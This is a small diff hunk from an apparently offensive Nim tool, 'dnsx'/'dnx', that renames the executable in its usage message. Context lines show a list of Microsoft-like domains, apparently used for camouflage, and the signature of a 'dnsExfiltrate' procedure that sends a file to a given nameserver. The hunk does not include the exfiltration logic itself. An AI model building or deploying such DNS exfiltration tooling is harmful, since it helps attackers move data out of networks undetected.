@@ -11,8 +11,8 @@ domains = [".msn.windows.com", ".update.microsoft.com", ".client.wns.windows.com
 ]#
 
 if paramCount() < 3:
-    echo "[!] Use: dnsx.exe <IP> <File> <Time between requests in ms>"
-    echo "[!] e.g: dnsx.exe 127.0.0.1 arquivo.pdf 1000"
+    echo "[!] Use: dnx.exe <IP> <File> <Time between requests in ms>"
+    echo "[!] e.g: dnx.exe 127.0.0.1 arquivo.pdf 1000"
     quit()
 
 proc dnsExfiltrate(ns: string, target: string, slp: int): void =
